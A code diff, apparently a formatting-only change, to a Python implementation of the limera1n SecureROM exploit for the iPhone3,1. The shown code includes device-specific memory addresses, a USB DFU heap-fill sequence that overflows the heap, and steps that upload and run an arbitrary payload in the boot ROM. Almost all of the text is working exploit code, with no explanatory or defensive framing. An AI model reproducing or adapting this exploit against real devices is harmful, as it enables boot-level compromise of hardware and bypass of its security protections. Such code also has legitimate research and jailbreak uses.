@@ -9,7 +9,6 @@ from device import Device, DeviceMode, acquire_device_with_timeout
 from os_build import DeviceModel
 from utils import TotalEnumMapping
 
-
 _Cursor = int
 
 
@@ -29,14 +28,16 @@ class SecureRomLimera1nExploitInfo:
 
     @classmethod
     def info_for_model(cls, model: DeviceModel) -> Self:
-        return TotalEnumMapping({
-            DeviceModel.iPhone3_1: cls(
-                receive_image_buf_base=VirtualMemoryPointer(0x84000000),
-                receive_image_buf_size=0x2c000,
-                dfu_max_packet_size=0x800,
-                return_to_stack_addr=VirtualMemoryPointer(0x8403BF9C),
-            )
-        })[model]
+        return TotalEnumMapping(
+            {
+                DeviceModel.iPhone3_1: cls(
+                    receive_image_buf_base=VirtualMemoryPointer(0x84000000),
+                    receive_image_buf_size=0x2C000,
+                    dfu_max_packet_size=0x800,
+                    return_to_stack_addr=VirtualMemoryPointer(0x8403BF9C),
+                )
+            }
+        )[model]
 
     @property
     def shellcode_addr(self) -> VirtualMemoryPointer:
@@ -56,8 +57,8 @@ def _write_u32(buf: bytearray, offset: _Cursor, val: int) -> _Cursor:
 
 def _upload_data_to_force_timeout(device: Device, exploit_info: SecureRomLimera1nExploitInfo) -> None:
     # The data isn't important, we just want to force a timeout
-    print('Sending arbitrary data to force a timeout')
-    data = exploit_info.full_dfu_packet_with_fill(0xbb)
+    print("Sending arbitrary data to force a timeout")
+    data = exploit_info.full_dfu_packet_with_fill(0xBB)
     try:
         device.dfu_upload_data(data, timeout_ms=10)
         raise UsbDidNotTimeout
@@ -68,13 +69,13 @@ def _upload_data_to_force_timeout(device: Device, exploit_info: SecureRomLimera1
 
 def execute_securerom_payload(payload: bytes) -> None:
     """Execute a payload in SecureROM using limera1n"""
-    print('Awaiting DFU device...')
+    print("Awaiting DFU device...")
     with acquire_device_with_timeout(DeviceMode.DFU, timeout=100) as device:
-        print(f'Got DFU device')
-        print(f'Executing a payload of {len(payload)} bytes in SecureROM via limera1n...')
+        print(f"Got DFU device")
+        print(f"Executing a payload of {len(payload)} bytes in SecureROM via limera1n...")
         exploit_info = SecureRomLimera1nExploitInfo.info_for_model(device.model)
 
-        dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xcc)
+        dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xCC)
         packet_cursor = 0
         for i in range(0, len(dfu_packet_buf), 0x40):
             packet_cursor = _write_u32(dfu_packet_buf, packet_cursor, 0x405)
@@ -84,20 +85,20 @@ def execute_securerom_payload(payload: bytes) -> None:
 
         # Send the heap fill
         # (This one includes the overflow data)
-        print('Sending heap fill')
+        print("Sending heap fill")
         device.dfu_upload_data(dfu_packet_buf)
 
         # Fill the heap with more garbage
-        print('Filling the heap with more garbage')
-        dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xcc)
+        print("Filling the heap with more garbage")
+        dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xCC)
         for i in range(0, exploit_info.receive_image_buf_size - 0x1800, exploit_info.dfu_max_packet_size):
             device.dfu_upload_data(dfu_packet_buf)
 
-        print('Sending payload...')
+        print("Sending payload...")
         device.dfu_upload_data(payload)
 
-        dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xbb)
-        device.handle.ctrl_transfer(0xa1, 1, 0, 0, dfu_packet_buf, 5000)
+        dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xBB)
+        device.handle.ctrl_transfer(0xA1, 1, 0, 0, dfu_packet_buf, 5000)
 
         _upload_data_to_force_timeout(device, exploit_info)
         # This should fail too
@@ -107,7 +108,7 @@ def execute_securerom_payload(payload: bytes) -> None:
         except usb.core.USBTimeoutError:
             # Expected/desired here
             pass
-        print(f'Sent exploit to overflow heap')
+        print(f"Sent exploit to overflow heap")
 
         # Reset the device and inform it there's a file ready to be processed
         try:
